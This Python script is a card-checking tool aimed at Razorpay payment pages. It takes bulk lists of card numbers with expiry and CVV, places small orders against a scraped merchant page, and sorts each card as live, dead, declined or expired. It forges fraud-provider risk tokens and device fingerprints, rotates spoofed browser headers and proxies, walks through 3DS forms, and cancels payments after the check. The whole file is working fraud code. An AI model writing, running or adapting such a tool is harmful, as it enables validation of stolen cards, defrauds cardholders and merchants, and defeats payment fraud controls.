import httpx
import re
import json
import base64
import time
import random
import hashlib
import uuid
import sys
import logging
import requests

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(name)s] %(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
]

APPROVED_KEYWORDS = ["cvv", "cvc", "security code", "address", "avs", "postal", "zip", "billing"]


class RazorpayAuto:
    def __init__(self, proxy: str = None):
        proxy_url = None
        if proxy:
            proxy_url = self._parse_proxy(proxy)

        ua = random.choice(USER_AGENTS)
        chrome_ver = "131"
        if "Chrome/" in ua:
            chrome_ver = ua.split("Chrome/")[1].split(".")[0]

        self.client = httpx.Client(
            http2=True,
            timeout=30,
            follow_redirects=True,
            proxy=proxy_url,
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "User-Agent": ua,
                "sec-ch-ua": f'"Google Chrome";v="{chrome_ver}", "Chromium";v="{chrome_ver}", "Not_A Brand";v="24"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "none",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
            }
        )
        self.device_id = str(uuid.uuid4())
        self.session_start = int(time.time() * 1000)
        self.data = None
        self.order = None
        self.session_token = None
        self.checkout_id = None
        self.iin_data = None
        self.forex_data = None
        self.notes = {}

    def _parse_proxy(self, proxy: str) -> str:
        proxy = proxy.strip()
        if "://" in proxy:
            return proxy
        parts = proxy.replace("@", ":").split(":")
        if len(parts) == 2:
            return f"http://{parts[0]}:{parts[1]}"
        elif len(parts) == 3:
            return f"{parts[0]}://{parts[1]}:{parts[2]}"
        elif len(parts) == 4:
            if parts[0].isdigit() or "." in parts[0]:
                return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            else:
                return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        elif len(parts) == 5:
            return f"{parts[0]}://{parts[3]}:{parts[4]}@{parts[1]}:{parts[2]}"
        return f"http://{proxy}"

    def extract(self, url: str):
        if "/pl_" in url:
            match = re.search(r'pl_([A-Za-z0-9]+)', url)
            if match:
                slug = f"pl_{match.group(1)}/view"
            else:
                slug = url.rstrip("/").split("/")[-1]
        else:
            slug = url.rstrip("/").split("/")[-1]
        resp = self.client.get(f"https://pages.razorpay.com/{slug}")
        match = re.search(r'var data = ({.*?});\s*// <<<JSON_DATA_END>>>', resp.text, re.DOTALL)
        if not match:
            raise Exception("Could not extract page data from Razorpay URL")
        self.data = json.loads(match.group(1))
        return self

    def create_order(self, amount_inr: int):
        pl_id = self.data["payment_link"]["id"]
        ppi_id = self.data["payment_link"]["payment_page_items"][0]["id"]
        amt = amount_inr * 100
        self.notes = {}
        udf = self.data["payment_link"]["settings"].get("udf_schema")
        if udf:
            schema = json.loads(udf) if isinstance(udf, str) else udf
            for field in schema:
                name = field["name"]
                if "email" in name.lower():
                    self.notes[name] = "hits@wasvictus.com"
                elif "phone" in name.lower() or "mobile" in name.lower():
                    self.notes[name] = "9876543210"
                else:
                    self.notes[name] = "wasvictus"
        resp = self.client.post(
            f"https://api.razorpay.com/v1/payment_pages/{pl_id}/order",
            json={"line_items": [{"payment_page_item_id": ppi_id, "amount": amt}], "notes": self.notes},
            headers={"Content-Type": "application/json", "Origin": "https://pages.razorpay.com", "Referer": "https://pages.razorpay.com/"}
        )
        self.order = resp.json()
        return self

    def get_checkout(self):
        keyless = self.data["keyless_header"]
        resp = self.client.get(
            "https://api.razorpay.com/v1/checkout/public",
            params={"traffic_env": "production", "checkout_v2": "1", "new_session": "1", "keyless_header": keyless}
        )
        match = re.search(r'session_token="([^"]+)"', resp.text)
        if match:
            self.session_token = match.group(1)
        sid_match = re.search(r'unified_session_id[=:]"?([A-Za-z0-9]+)"?', resp.text)
        self.checkout_id = sid_match.group(1) if sid_match else f"Chk{int(time.time()*1000)%10000000000:010d}"[:14]
        return self

    def get_iin(self, card: str):
        order_id = self.order["order"]["id"]
        keyless = self.data["keyless_header"]
        iin = card.replace(" ", "").replace("-", "")[:6]
        resp = self.client.get(
            "https://api.razorpay.com/v1/standard_checkout/payment/iin",
            params={"x_entity_id": order_id, "session_token": self.session_token, "keyless_header": keyless, "iin": iin},
            headers={"Content-type": "application/x-www-form-urlencoded", "x-session-token": self.session_token, "Origin": "https://api.razorpay.com", "Referer": "https://api.razorpay.com/"}
        )
        self.iin_data = resp.json()
        return self

    def get_forex(self):
        currency = self.order["order"]["currency"]
        if currency == "INR" or not self.iin_data or self.iin_data.get("country") == "IN":
            return self
        order_id = self.order["order"]["id"]
        keyless = self.data["keyless_header"]
        amount = self.order["order"]["amount"]
        payload = {
            "identifiers": {
                "merchant": {"country": "IN"},
                "card": {"country": self.iin_data.get("country", "US"), "dcc_blacklist": self.iin_data.get("dcc_blacklisted", False), "network": self.iin_data.get("network", "Visa")},
                "method": "card",
                "payment_currency": currency
            },
            "forex_charges": {"amount": amount, "currency": currency, "filters": {"method": "card"}}
        }
        resp = self.client.post(
            "https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows",
            params={"x_entity_id": order_id, "keyless_header": keyless},
            json=payload,
            headers={"Content-type": "application/json", "x-session-token": self.session_token, "Origin": "https://api.razorpay.com", "Referer": "https://api.razorpay.com/"}
        )
        if resp.status_code == 200:
            self.forex_data = resp.json()
        return self

    def pay(self, card: str, month: str, year: str, cvv: str):
        order_id = self.order["order"]["id"]
        keyless = self.data["keyless_header"]
        pl_id = self.data["payment_link"]["id"]
        currency = self.order["order"]["currency"]
        card_clean = card.replace(" ", "").replace("-", "")
        amount = self.order["order"]["amount"]
        payload = {
            "payment_link_id": pl_id,
            "contact": "+919876543210",
            "email": "hits@wasvictus.com",
            "currency": currency,
            "_[integration]": "payment_pages",
            "_[checkout_id]": self.checkout_id or order_id[:14],
            "_[library]": "checkoutjs",
            "_[platform]": "browser",
            "_[device_id]": self.device_id,
            "amount": amount,
            "order_id": order_id,
            "method": "card",
            "card[number]": card_clean,
            "card[cvv]": cvv,
            "card[name]": "wasvictus",
            "card[expiry_month]": month.zfill(2),
            "card[expiry_year]": year if len(year) == 4 else f"20{year}",
            "save": "0",
            "user_risk_providers_token": self._gen_risk_token()
        }
        for k, v in self.notes.items():
            payload[f"notes[{k}]"] = v
        if self.forex_data and "forex_charges" in self.forex_data:
            payload["currency_request_id"] = self.forex_data["forex_charges"]["id"]
            payload["dcc_currency"] = self.forex_data["identifiers"].get("native_currency", currency)
        resp = self.client.post(
            "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax",
            params={"x_entity_id": order_id, "session_token": self.session_token, "keyless_header": keyless},
            data=payload,
            headers={"Content-type": "application/x-www-form-urlencoded", "x-session-token": self.session_token, "Origin": "https://api.razorpay.com", "Referer": "https://api.razorpay.com/"}
        )
        return resp.json()

    def _gen_risk_token(self):
        sid = self.checkout_id or f"Chk{int(time.time()*1000)%10000000000:010d}"[:14]
        ts = int(time.time() * 1000)
        fingerprint = hashlib.sha256(f"{self.device_id}{ts}{random.randint(1000,9999)}".encode()).hexdigest()[:32]

        sardine_data = {
            "name": "sardine",
            "metadata": {
                "session_id": sid,
                "device_id": self.device_id,
                "fingerprint": fingerprint,
                "timestamp": ts,
                "session_start": self.session_start,
                "page_loads": random.randint(1, 3),
                "interactions": random.randint(5, 15),
            }
        }
        return base64.b64encode(json.dumps([sardine_data]).encode()).decode()

    def cancel_payment(self, payment_id: str):
        order_id = self.order["order"]["id"]
        keyless = self.data["keyless_header"]
        resp = self.client.get(
            f"https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel",
            params={"x_entity_id": order_id, "session_token": self.session_token, "keyless_header": keyless},
            headers={"Content-type": "application/x-www-form-urlencoded", "x-session-token": self.session_token, "Origin": "https://api.razorpay.com", "Referer": "https://api.razorpay.com/"}
        )
        try:
            return resp.json()
        except:
            return {"error": {"description": "Request failed", "reason": f"http_{resp.status_code}"}}

    def complete_auth(self, auth_url: str, payment_id: str):
        risk_token = self._gen_risk_token()
        resp = self.client.post(auth_url, data={"user_risk_providers_token": risk_token}, headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://api.razorpay.com", "Referer": auth_url})
        html = resp.text
        result = self._check_html_result(html)
        if result:
            return self._finalize_result(result, payment_id)
        if "form3" in html:
            form4_match = re.search(r'<form[^>]*id="form4"[^>]*action="([^"]*)"[^>]*>.*?<input[^>]*name="threeDSMethodData"[^>]*value="([^"]*)"', html, re.DOTALL)
            if form4_match:
                try:
                    self.client.post(form4_match.group(1), data={"threeDSMethodData": form4_match.group(2)}, headers={"Origin": "https://api.razorpay.com", "Referer": auth_url})
                except:
                    pass
            form3_data = {
                "browser_java_enabled": "false",
                "browser_javascript_enabled": "true",
                "browser_timezone_offset": "-330",
                "browser_color_depth": "24",
                "browser_screen_width": "1920",
                "browser_screen_height": "1080",
                "browser_language": "en-US",
                "auth_step": "3ds2Auth",
                "user_risk_providers_token": self._gen_risk_token()
            }
            resp = self.client.post(auth_url, data=form3_data, headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://api.razorpay.com", "Referer": auth_url})
            html = resp.text
            result = self._check_html_result(html)
            if result:
                return self._finalize_result(result, payment_id)
        html_lower = html.lower()
        if any(x in html_lower for x in ["creq", "challenge", "pareq", "acsurl", "3dsecure"]):
            return {"status": "FAILED", "error": "3DS Required", "reason": "3ds_required"}
        if "otp" in html_lower and any(x in html_lower for x in ["enter", "verify", "input"]):
            return {"status": "FAILED", "error": "OTP Required", "reason": "otp_required"}
        if "processing" in html_lower and "please wait" in html_lower:
            return {"status": "FAILED", "error": "Processing Timeout", "reason": "processing"}
        cancel_result = self.cancel_payment(payment_id)
        if cancel_result and "error" in cancel_result:
            err = cancel_result["error"]
            reason = err.get("reason", "unknown")
            desc = err.get("description", "Unknown")
            if reason == "payment_cancelled" and 'class="show f"' not in html:
                return {"status": "FAILED", "error": "3DS Required", "reason": "3ds_required"}
            if reason not in ("payment_cancelled",):
                return {"status": "FAILED", "error": desc, "reason": reason}
            return {"status": "FAILED", "error": "Payment Failed", "reason": "declined"}
        return {"status": "FAILED", "error": "Unknown", "reason": "unknown"}

    def _check_html_result(self, html: str):
        if 'class="show s"' in html:
            m = re.search(r'var data = (\{[^;]*\});', html)
            if m:
                try:
                    data = json.loads(m.group(1))
                    if "razorpay_payment_id" in data:
                        return {"status": "SUCCESS", "payment_id": data["razorpay_payment_id"]}
                except:
                    pass
            return {"status": "SUCCESS"}
        if 'class="show f"' in html:
            return {"status": "FAILED_SHOW_F"}
        m = re.search(r'var data = (\{.*?\});', html, re.DOTALL)
        if m:
            try:
                data_str = m.group(1).strip()
                if data_str == "{}":
                    return {"status": "FAILED_EMPTY_DATA"}
                data = json.loads(data_str)
                if "razorpay_payment_id" in data:
                    return {"status": "SUCCESS", "payment_id": data["razorpay_payment_id"]}
                if "error" in data:
                    err = data["error"]
                    return {"status": "FAILED", "error": err.get("description", str(err)) if isinstance(err, dict) else str(err), "reason": err.get("reason", "unknown") if isinstance(err, dict) else "unknown"}
            except:
                pass
        return None

    def _finalize_result(self, result: dict, payment_id: str):
        if result["status"] == "SUCCESS":
            return result
        if result["status"] in ("FAILED_SHOW_F", "FAILED_EMPTY_DATA"):
            cancel_result = self.cancel_payment(payment_id)
            if cancel_result and "error" in cancel_result:
                err = cancel_result["error"]
                reason = err.get("reason", "unknown")
                desc = err.get("description", "Payment Failed")
                if reason == "payment_cancelled":
                    return {"status": "FAILED", "error": "Payment Failed", "reason": "declined"}
                return {"status": "FAILED", "error": desc, "reason": reason}
            return {"status": "FAILED", "error": "Payment Failed", "reason": "declined"}
        return result

    def close(self):
        self.client.close()


def fetch_bin_info(bin6):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    services = [
        f"https://lookup.binlist.net/{bin6}",
        f"https://api.binlist.io/{bin6}",
    ]
    for url in services:
        try:
            res = requests.get(url, headers=headers, timeout=8)
            if res.status_code == 200:
                data = res.json()
                bank = data.get("bank", {}).get("name", "Unknown") if isinstance(data.get("bank"), dict) else "Unknown"
                scheme = data.get("scheme", "Unknown").upper()
                card_type = data.get("type", "Unknown").upper()
                country = data.get("country", {}).get("name", "Unknown") if isinstance(data.get("country"), dict) else "Unknown"
                return bank, f"{scheme}/{card_type}", country
        except Exception:
            continue
    return "Unknown", "Unknown", "Unknown"


def analyze_result(result, error_msg=None, reason=None):
    if not result:
        return "ERROR", error_msg or "Unknown error", "ERROR"

    status = result.get("status", "").upper()
    error = result.get("error", "")
    rsn = result.get("reason", reason or "unknown")

    if isinstance(error, dict):
        error_desc = error.get("description", "Unknown")
        rsn = error.get("reason", rsn)
    else:
        error_desc = str(error) if error else ""

    error_lower = error_desc.lower()

    if status == "SUCCESS":
        return "LIVE", "Payment Successful", "LIVE"

    if any(kw in error_lower for kw in APPROVED_KEYWORDS):
        return "LIVE", f"Approved - {error_desc}", "LIVE"

    if any(kw in error_lower for kw in ["insufficient", "balance", "limit exceeded"]):
        return "LIVE", f"Insufficient funds - {error_desc}", "LIVE"

    if any(kw in error_lower for kw in ["do not honor", "do not honour"]):
        return "DEAD", f"Do not honor - {error_desc}", "DEAD"

    if any(kw in error_lower for kw in ["expired", "expiry", "invalid expiry"]):
        return "EXPIRED", f"Expired - {error_desc}", "EXPIRED"

    if any(kw in error_lower for kw in ["cvv", "cvc", "security code"]):
        return "LIVE", f"CVV mismatch - {error_desc}", "LIVE"

    if any(kw in error_lower for kw in ["invalid card", "incorrect card", "wrong card", "malformed", "card number is invalid"]):
        return "DEAD", f"Invalid card - {error_desc}", "DEAD"

    if any(kw in error_lower for kw in ["declined", "not authorized", "authorization failed", "not permitted", "refer to card issuer"]):
        return "DECLINED", f"Declined - {error_desc}", "DECLINED"

    if any(kw in error_lower for kw in ["risk", "fraud", "blocked", "restricted", "pickup", "pick up", "lost", "stolen"]):
        return "DEAD", f"Risk/Blocked - {error_desc}", "DEAD"

    if rsn == "3ds_required":
        return "LIVE", "3DS Required (card valid)", "LIVE"

    if rsn == "otp_required":
        return "LIVE", "OTP Required (card valid)", "LIVE"

    if error_desc:
        return "DECLINED", error_desc, "DECLINED"

    return "UNKNOWN", "Unknown response", "UNKNOWN"


def process_single_card(card_line, rp, amount_inr, proxy=None):
    start_time = time.time()

    def safe_mask(line):
        cleaned = re.sub(r'[^0-9]', '', line.split('|')[0] if '|' in line else line)
        if len(cleaned) >= 10:
            return f"{cleaned[:6]}******{cleaned[-4:]}"
        elif len(cleaned) >= 4:
            return f"{'*' * (len(cleaned) - 4)}{cleaned[-4:]}"
        return "****"

    try:
        parts = card_line.replace('/', '|').replace(' ', '|').split('|')
        if len(parts) < 4:
            return {
                "card": "REDACTED", "masked": safe_mask(card_line),
                "status": "ERROR", "message": "Invalid card format (need CC|MM|YY|CVV)",
                "category": "ERROR",
                "bank": "N/A", "scheme": "N/A", "country": "N/A",
                "time": 0
            }
        card_number, exp_month, exp_year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    except Exception:
        return {
            "card": "REDACTED", "masked": safe_mask(card_line),
            "status": "ERROR", "message": "Invalid card format",
            "category": "ERROR",
            "bank": "N/A", "scheme": "N/A", "country": "N/A",
            "time": 0
        }

    masked = f"{card_number[:6]}******{card_number[-4:]}" if len(card_number) >= 10 else safe_mask(card_line)
    bank, scheme, country = fetch_bin_info(card_number[:6])

    try:
        rp.create_order(amount_inr).get_checkout()
        rp.get_iin(card_number).get_forex()

        logger.info(f"Order: {rp.order['order']['id']} for {masked}")

        result = rp.pay(card_number, exp_month, exp_year, cvv)

        if "razorpay_payment_id" in result:
            status_cat, message, category = "LIVE", "Payment Successful", "LIVE"
            logger.info(f"Payment SUCCESS for {masked}: {result['razorpay_payment_id']}")
        elif "payment_id" in result:
            payment_id = result["payment_id"]
            auth_url = result.get("request", {}).get("url", "")
            logger.info(f"3DS auth for {masked}: {payment_id}")
            if auth_url:
                auth_result = rp.complete_auth(auth_url, payment_id)
                status_cat, message, category = analyze_result(auth_result)
            else:
                status_cat, message, category = "LIVE", "3DS redirect (card valid)", "LIVE"
        elif "error" in result:
            status_cat, message, category = analyze_result(result)
        else:
            status_cat, message, category = "UNKNOWN", "Unexpected response", "UNKNOWN"

    except Exception as e:
        logger.error(f"Payment error for {masked}: {e}")
        status_cat = "ERROR"
        message = str(e)[:150]
        category = "ERROR"

    duration = round(time.time() - start_time, 2)

    return {
        "card": card_line, "masked": masked,
        "status": status_cat, "message": message,
        "category": category,
        "bank": bank, "scheme": scheme, "country": country,
        "time": duration
    }


def run_razorpay_check_streaming(cards_text, pages_url, amount_inr=1, proxy=None):
    cards = [c.strip() for c in cards_text.strip().split('\n') if c.strip()]
    if not cards:
        yield {"type": "error", "message": "No cards provided"}
        return

    site_url = pages_url.strip().split('\n')[0].strip()
    if not site_url:
        yield {"type": "error", "message": "No Razorpay page URL provided"}
        return

    yield {"type": "status", "message": "Extracting merchant data from payment page..."}

    rp = RazorpayAuto(proxy=proxy)
    try:
        rp.extract(site_url)
        logger.info(f"Extracted page data from {site_url}")
    except Exception as e:
        logger.error(f"Failed to extract page data: {e}")
        yield {"type": "error", "message": f"Failed to extract merchant data: {str(e)[:200]}"}
        rp.close()
        return

    yield {"type": "status", "message": f"Starting check for {len(cards)} card(s)..."}
    yield {"type": "init", "total": len(cards)}

    for i, card_line in enumerate(cards):
        try:
            result = process_single_card(card_line, rp, amount_inr, proxy)
            result["index"] = i + 1
            result["total"] = len(cards)
            yield {"type": "result", "data": result}
        except Exception as e:
            cc_part = re.sub(r'[^0-9]', '', card_line.split('|')[0] if '|' in card_line else card_line)
            safe_m = f"{cc_part[:6]}******{cc_part[-4:]}" if len(cc_part) >= 10 else "****"
            yield {"type": "result", "data": {
                "card": "REDACTED", "masked": safe_m,
                "status": "ERROR", "message": str(e)[:100],
                "category": "ERROR",
                "bank": "N/A", "scheme": "N/A", "country": "N/A",
                "time": 0, "index": i + 1, "total": len(cards)
            }}

        if i < len(cards) - 1:
            time.sleep(random.uniform(1.0, 2.0))

    rp.close()
    yield {"type": "done", "message": "All cards processed"}


def run_razorpay_check(cards_text, pages_url, amount_inr=1, proxy=None):
    results = []
    errors = []
    for event in run_razorpay_check_streaming(cards_text, pages_url, amount_inr, proxy):
        if event["type"] == "result":
            results.append(event["data"])
        elif event["type"] == "error":
            errors.append(event["message"])
    return results, errors


def main():
    proxy = None
    args = sys.argv[1:]
    for i, arg in enumerate(args):
        if arg == "--proxy" and i + 1 < len(args):
            proxy = args[i + 1]

    print("\n[RAZORPAY AUTO]")
    url = input("URL: ").strip()
    amount = int(input("Amount (INR): ").strip())
    card_input = input("Card|MM|YY|CVV: ").strip()
    card, month, year, cvv = card_input.split("|")

    rp = RazorpayAuto(proxy=proxy)
    try:
        rp.extract(url).create_order(amount).get_checkout()
        rp.get_iin(card).get_forex()
        print(f"\nOrder: {rp.order['order']['id']}")
        print(f"Price: {rp.order['order']['amount']/100} {rp.order['order']['currency']}")
        if rp.iin_data:
            print(f"Card: {rp.iin_data.get('network', '?')} ({rp.iin_data.get('country', '?')})")
        result = rp.pay(card, month, year, cvv)
        if "razorpay_payment_id" in result:
            print(f"Payment: {result['razorpay_payment_id']}")
            print("Status: SUCCESS")
        elif "payment_id" in result:
            payment_id = result["payment_id"]
            auth_url = result["request"]["url"]
            print(f"Payment: {payment_id}")
            auth_result = rp.complete_auth(auth_url, payment_id)
            print(f"Status: {auth_result['status']}")
            if auth_result["status"] == "SUCCESS":
                print(f"Confirmed: {auth_result.get('payment_id', payment_id)}")
            else:
                print(f"Error: {auth_result.get('error', 'Unknown')}")
                print(f"Reason: {auth_result.get('reason', 'unknown')}")
        elif "error" in result:
            print("Status: FAILED")
            err = result["error"]
            if isinstance(err, dict):
                print(f"Error: {err.get('description', 'Unknown')}")
                print(f"Reason: {err.get('reason', 'unknown')}")
            else:
                print(f"Error: {err}")
        else:
            print(f"Response: {json.dumps(result)}")
    finally:
        rp.close()


if __name__ == "__main__":
    main()
